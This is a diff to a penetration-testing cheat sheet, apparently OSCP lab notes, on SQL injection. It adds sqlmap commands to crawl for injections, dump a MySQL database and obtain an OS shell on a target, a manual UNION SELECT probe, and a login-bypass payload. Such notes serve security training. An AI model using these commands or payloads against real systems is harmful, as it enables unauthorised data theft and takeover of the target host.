@@ -134,14 +134,28 @@ Enum using nmap
     nmap -sV --script=http-sql-injection <target>  
     
 Using jsql 
+
+### SQLMAP (Not allowed on OSCP exam but good for labs!) 
+Crawl a page to find sql-injections
+
+    sqlmap -u http://example.com --crawl=1
+Dump database 
+
+    sqlmap -u http://172.21.0.0 --dbms=mysql --dump
+Get a shell 
+
+    sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell
 Using sqlmap with login-page  
 Capture the request using burp suite, and save the request in a file.
 
     sqlmap -r request.txt
-Crawl a page to find sql-injections
 
-    sqlmap -u http://example.com --crawl=1
 
+### Manual Testing 
+For a row 
+
+    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
+    
 Login bypass
 
     'or 1=1- -
